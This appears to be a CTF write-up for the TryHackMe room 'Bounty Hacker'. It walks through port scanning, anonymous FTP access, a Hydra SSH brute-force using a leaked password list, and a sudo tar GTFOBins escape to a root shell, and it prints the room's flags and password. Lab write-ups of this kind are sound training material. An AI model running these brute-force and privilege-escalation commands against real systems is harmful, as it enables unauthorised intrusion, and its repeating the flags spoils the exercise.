## Bounty Hacker - TryHackMe Writeup

[Room Link](https://tryhackme.com/room/cowboyhacker)

<i>You were boasting on and on about your elite hacker skills in the bar and a few Bounty Hunters decided they'd take you up on claims! Prove your status is more than just a few glasses at the bar. I sense bell peppers & beef in your future!</i> 

**IP: 10.10.192.55**

---

## 📌 General Information

**Room Difficulty**: Easy  <br>

**Room Type**: Linux Privilege Escalation, Brute Force <br>

**Tools Used**: Nmap, Gobuster, Hydra<br>

**Author**: <br>

[<img align='center' src="https://github.com/mauzware/mauzware/blob/main/LOGO%20CUT.png"/>](https://github.com/mauzware)

[TryHackMe Profile](https://tryhackme.com/p/mauzinho) <br>
[GitHub Profile](https://github.com/mauzware)

---

## 🔍 Enumeration

- As always start with Nmap and Gobuster.

  ```
  nmap -sC -sV -T5 -p- 10.10.192.55

  PORT   STATE SERVICE VERSION
  21/tcp open  ftp     vsftpd 3.0.3
  | ftp-syst: 
  |   STAT: 
  | FTP server status:
  |      Connected to ::ffff:10.8.120.52
  |      Logged in as ftp
  |      TYPE: ASCII
  |      No session bandwidth limit
  |      Session timeout in seconds is 300
  |      Control connection is plain text
  |      Data connections will be plain text
  |      At session startup, client count was 4
  |      vsFTPd 3.0.3 - secure, fast, stable
  |_End of status
  | ftp-anon: Anonymous FTP login allowed (FTP code 230)
  |_Can't get directory listing: TIMEOUT
  22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey: 
  |   2048 dc:f8:df:a7:a6:00:6d:18:b0:70:2b:a5:aa:a6:14:3e (RSA)
  |   256 ec:c0:f2:d9:1e:6f:48:7d:38:9a:e3:bb:08:c4:0c:c9 (ECDSA)
  |_  256 a4:1a:15:a5:d4:b1:cf:8f:16:50:3a:7d:d0:d8:13:c2 (ED25519)
  80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
  |_http-server-header: Apache/2.4.18 (Ubuntu)
  |_http-title: Site doesn't have a title (text/html).
  Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
  ```

  ```
  gobuster dir -u http://10.10.192.55/ -w /usr/share/wordlists/dirb/common.txt 

  ===============================================================
  Starting gobuster in directory enumeration mode
  ===============================================================
  /.htaccess            (Status: 403) [Size: 277]
  /.hta                 (Status: 403) [Size: 277]
  /.htpasswd            (Status: 403) [Size: 277]
  /images               (Status: 301) [Size: 313] [--> http://10.10.192.55/images/]
  /index.html           (Status: 200) [Size: 969]
  /server-status        (Status: 403) [Size: 277]
  Progress: 4614 / 4615 (99.98%)
  ===============================================================
  Finished
  ===============================================================
  ```
  
- When I visited web page I found nothing except GOATEST ANIME EVER OFC!!! ❤️
  
- Since we can login as Anonymous with FTP, let's do that. There's two files in that directory, get them both to your Kali.

  ```
  ftp 10.10.192.55
  Anonymous
  
  
  ftp> ls
  229 Entering Extended Passive Mode (|||64010|)
  pwd
  ^C
  receive aborted. Waiting for remote to finish abort.
  ftp> 
  ftp> passive
  Passive mode: off; fallback to active mode: off.
  ftp> ls
  200 EPRT command successful. Consider using EPSV.
  150 Here comes the directory listing.
  -rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
  -rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
  226 Directory send OK.
  ftp> pwd
  Remote directory: /

  cat task.txt    
  1.) Protect Vicious.
  2.) Plan for Red Eye pickup on the moon.
  
  -lin
  
  cat locks.txt 
  rEddrAGON
  ReDdr4g0nSynd!cat3
  Dr@gOn$yn9icat3
  R3DDr46ONSYndIC@Te
  ReddRA60N
  R3dDrag0nSynd1c4te
  dRa6oN5YNDiCATE
  ReDDR4g0n5ynDIc4te
  R3Dr4gOn2044
  RedDr4gonSynd1cat3
  R3dDRaG0Nsynd1c@T3
  Synd1c4teDr@g0n
  reddRAg0N
  REddRaG0N5yNdIc47e
  Dra6oN$yndIC@t3
  4L1mi6H71StHeB357
  rEDdragOn$ynd1c473
  DrAgoN5ynD1cATE
  ReDdrag0n$ynd1cate
  Dr@gOn$yND1C4Te
  RedDr@gonSyn9ic47e
  REd$yNdIc47e
  dr@goN5YNd1c@73
  rEDdrAGOnSyNDiCat3
  r3ddr@g0N
  ReDSynd1ca7e
  ```

- Beautiful, we even have brute force material, let's do it.

  ```
  hydra -l lin -P locks.txt 10.10.192.55 ssh
  [22][ssh] host: 10.10.192.55   login: lin   password: RedDr4gonSynd1cat3
  1 of 1 target successfully completed, 1 valid password found
  ```

---

## 🧍 User Privilege Escalation

- After logging in with SSH, first flag is already there. Moving to root flag.

  ```
  lin@bountyhacker:~/Desktop$ pwd
  /home/lin/Desktop
  
  lin@bountyhacker:~/Desktop$ ls
  user.txt
  
  lin@bountyhacker:~/Desktop$ cat user.txt 
  THM{CR1M3_SyNd1C4T3}
  ```
  
---

## 👑 Root Privilege Escalation

- For this one `sudo -l` did all the job, you can find the exploit on GTFOBins.

  ```
  lin@bountyhacker:~/Desktop$ sudo -l
  [sudo] password for lin: 
  Matching Defaults entries for lin on bountyhacker:
      env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
  
  User lin may run the following commands on bountyhacker:
      (root) /bin/tar
  
  lin@bountyhacker:~/Desktop$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
  tar: Removing leading `/' from member names
  # whoami
  root
  # id
  uid=0(root) gid=0(root) groups=0(root)
  # cat /root/root.txt
  THM{80UN7Y_h4cK3r}
  ```
  
- That's all folks, I still can't believe that I did this CTF in less than 5 minutes lol. Happy Hacking!

---

## 🏁 Flags

- **User Flag**: `THM{CR1M3_SyNd1C4T3}`
- **Root Flag**: `THM{80UN7Y_h4cK3r}`

---

## 💬 Notes & Reflections

- What was challenging in this room for me?
  `/`

- What did I learn?
  `That I improved my skills a lot, I finished this CTF in less than 5 min. Started at 22:03 and finished at 22:07.`

- I would recommend this room or any type of CTF challenge to every Cyber Security enthusiast since it will sharpen your skills better than any book/tutorial/course or walkthrough rooms on many different platforms!

- Thank you for reading! Enjoy, Have Fun and Happy Hacking! 🤟

---
